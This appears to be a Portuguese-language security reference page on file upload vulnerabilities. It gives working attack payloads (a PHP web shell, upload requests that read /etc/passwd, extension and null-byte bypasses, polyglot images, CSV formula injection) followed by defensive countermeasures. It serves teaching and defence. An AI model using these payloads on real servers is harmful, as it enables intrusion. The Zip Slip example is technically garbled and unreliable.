# File Upload Vulnerabilities

## 📊 Metadados

| Propriedade | Valor |
|---|---|
| **CVSS Score** | 8.8 (Alto) |
| **OWASP Top 10** | #6 - Security Misconfiguration |
| **CWE** | CWE-434 |
| **Status** | ⚠️ Ativo e crítico |
| **Impacto** | RCE, DoS, Data Exfiltration |
| **Severidade** | 🔴 ALTO |

---

## 🔍 O que é File Upload Vulnerability?

File upload vulnerabilities ocorrem quando o servidor não valida adequadamente:

- **Tipo de arquivo** (MIME type)
- **Extensão do arquivo**
- **Conteúdo do arquivo**
- **Tamanho do arquivo**
- **Nome do arquivo**
- **Localização de armazenamento**

Isso pode resultar em:

- **Remote Code Execution (RCE)** - Upload de web shells
- **Malware Distribution** - Distribuição de trojans
- **Data Exfiltration** - Roubo de dados sensíveis
- **Denial of Service** - Consumo de storage/processamento
- **Server Compromise** - Acesso completo ao servidor

---

## 💥 Exemplos Práticos de Exploração

### 1. **Upload Básico de Shell (RCE)**

**Arquivo malicioso - shell.php**
```php
<?php
system($_GET['cmd']);
?>
```

**Acesso:**
```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data

---BOUNDARY---
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
---BOUNDARY---

# Exploração
GET /uploads/shell.php?cmd=whoami
→ www-data

GET /uploads/shell.php?cmd=cat%20/etc/passwd
→ root:x:0:0:...
```

---

### 2. **Bypass de Validação - Extensões**

**Técnica:** Contornar blacklist de extensões

```
# Variações de PHP
.php          (bloqueado)
.phtml        ✅ Interpretado
.php3, .php4, .php5, .php7, .php8  ✅
.phps         (source code)
.pht          ✅ Algumas configurações
.phar         ✅ Se Apache configurado

# Variações de ASP
.asp          (bloqueado)
.aspx         ✅ .NET
.cer, .asa    ✅ Algumas configurações

# Variações de JSP
.jsp          (bloqueado)
.jspx         ✅
.jsw, .jsv, .jspf  ✅

# Caso sensitivity
shell.PhP     ✅ Se validação case-sensitive
SHELL.PHP     ✅

# Double extension
shell.php.jpg ✅ (servidor processa como .php)
```

---

### 3. **Nullbyte Injection**

**Técnica:** Usar nullbyte para truncar nome do arquivo

```
# Payload
shell.php%00.jpg

# Processamento
shell.php%00.jpg → shell.php (truncado no nullbyte)
→ Salvo como: shell.php

# Variação
shell.php\x00.jpg
shell.php::$DATA.jpg  (NTFS Alternate Data Stream)
```

---

### 4. **Ponto Duplo (Double Dot)**

**Técnica:** Contornar validação de nome

```
shell.php....
→ Salvo como: shell.php

shell.phtml....
→ Interpretado como .phtml
```

---

### 5. **MIME Type Bypass**

**Validação fraca - Verificar apenas MIME type**

```
# ❌ Validação
if ($_FILES['file']['type'] == 'image/jpeg') {
    // Permitir upload
}

# ✅ Exploit
Content-Type: image/jpeg (mas conteúdo é PHP)

POST /upload HTTP/1.1
Content-Type: multipart/form-data

---BOUNDARY---
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
---BOUNDARY---
```

---

### 6. **Polyglot Files**

**Técnica:** Arquivo válido em múltiplos formatos

**GIF + PHP:**
```
GIF89a;
<?php system($_GET['cmd']); ?>
```

**JPG + PHP:**
```
# Arquivo JPEG válido + código PHP no final
[JPEG BINARY DATA]<?php system($_GET['cmd']); ?>
```

**PNG + PHP:**
```
# Arquivo PNG + comentário PHP
[PNG BINARY DATA]\x00PHP CODE HERE
```

**Exploração:**
```
$ file shell.gif
shell.gif: GIF image data, version 89a

# Mas servidor interpreta como PHP!
GET /uploads/shell.gif?cmd=whoami
→ www-data
```

---

### 7. **Directory Traversal + File Upload**

**Técnica:** Subir arquivo em diretório específico

```
# Payload
filename: ../../shell.php

# Salvo em:
/var/www/html/shell.php (em vez de /var/www/html/uploads/)

# Direto na webroot!
GET /shell.php?cmd=whoami
→ www-data
```

---

### 8. **CSV/Excel Injection (Formula Injection)**

**Arquivo malicioso - data.csv**
```csv
Name,Email
admin,=cmd|'/c calc'!A0
```

**Exploração:**
- Excel abre o arquivo
- Fórmula é executada
- Calc.exe é aberto (ou comando malicioso)

---

### 9. **Zip Slip Vulnerability**

**Técnica:** Arquivo ZIP com path traversal

```bash
# Criar ZIP malicioso
zip -r archive.zip shell.php
# Editar para adicionar traverse
echo '../../shell.php' > shell.php.zip

# Servidor extrai:
# /var/www/html/shell.php (em vez de uploads/shell.php)
```

---

### 10. **Race Condition Upload**

**Técnica:** Acessar arquivo antes de validação

```
1. Upload arquivo shell.php
2. Servidor valida extensão (falha)
3. Antes de deletar, fazer request:
   GET /temp/shell.php?cmd=whoami
   → Executa!
```

---

## 🛡️ Contramedidas e Prevenção

### 1. **Validar Tipo de Arquivo**

```python
# ❌ Vulnerável
if file.content_type == 'image/jpeg':
    save_file(file)

# ✅ Seguro - Verificar magic bytes
import magic
def validate_image(file):
    mime = magic.from_buffer(file.read(1024), mime=True)
    if mime not in ['image/jpeg', 'image/png', 'image/gif']:
        raise ValueError("Tipo de arquivo inválido")
    return True
```

### 2. **Whitelist de Extensões**

```python
ALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif', 'webp'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```

### 3. **Renomear Arquivo**

```python
from uuid import uuid4
import os

# ❌ Vulnerável
with open(filename, 'wb') as f:
    f.write(file.read())

# ✅ Seguro
new_filename = f"{uuid4()}.jpg"
with open(new_filename, 'wb') as f:
    f.write(file.read())
```

### 4. **Armazenar Fora do Webroot**

```python
# ❌ Vulnerável
UPLOAD_DIR = '/var/www/html/uploads/'

# ✅ Seguro - Fora do webroot
UPLOAD_DIR = '/var/data/uploads/'  # Não serve via HTTP

# Servir com validação
@app.route('/download/<file_id>')
def download(file_id):
    file = Database.get_file(file_id)
    return send_file(file.path)
```

### 5. **Limitar Tamanho de Arquivo**

```python
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

if len(file.read()) > MAX_FILE_SIZE:
    raise ValueError("Arquivo muito grande")
```

### 6. **Validar Nome do Arquivo**

```python
import re

def validate_filename(filename):
    # Apenas alfanuméricos, pontos, hífens
    if not re.match(r'^[a-zA-Z0-9._-]{1,255}$', filename):
        raise ValueError("Nome de arquivo inválido")
    
    # Sem traversal
    if '..' in filename or '/' in filename:
        raise ValueError("Path traversal detectado")
    
    return filename
```

### 7. **Desabilitar Execução em Upload Dir**

**Apache (.htaccess):**
```apache
<FilesMatch "\.php$">
    Order Allow,Deny
    Deny from all
</FilesMatch>

php_flag engine off
```

**Nginx (nginx.conf):**
```nginx
location /uploads {
    location ~ \.php$ {
        return 403;
    }
}
```

### 8. **Scan com Antivírus**

```python
import subprocess

def scan_file(filepath):
    result = subprocess.run(['clamscan', filepath], 
                          capture_output=True)
    if result.returncode != 0:
        raise ValueError("Arquivo malicioso detectado")
```

### 9. **Usar CDN/Cloud Storage**

```python
# ✅ Seguro - S3/GCS/Azure Blob
import boto3

s3 = boto3.client('s3')
s3.put_object(
    Bucket='my-bucket',
    Key=f'uploads/{uuid4()}.jpg',
    Body=file.read()
)
```

---

## 🔎 Detecção em Tempo Real

### Padrões Suspeitos
- Extensões executáveis: .php, .exe, .bat, .sh
- Caracteres especiais: %00, ../, ...
- MIME type mismatched
- Nomes de arquivo suspeitos

### Ferramentas de Teste
- **Burp Suite:** Upload scanner
- **OWASP ZAP:** Passive scan
- **File upload checker scripts**

---

## 📚 Referências

| Fonte | Link |
|---|---|
| PortSwigger Academy | https://portswigger.net/web-security/file-upload |
| OWASP File Upload | https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload |
| HackTricks File Upload | https://book.hacktricks.xyz/pentesting-web/file-upload |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files |
| CWE-434 | https://cwe.mitre.org/data/definitions/434.html |

---

**Última atualização:** Agosto 2026
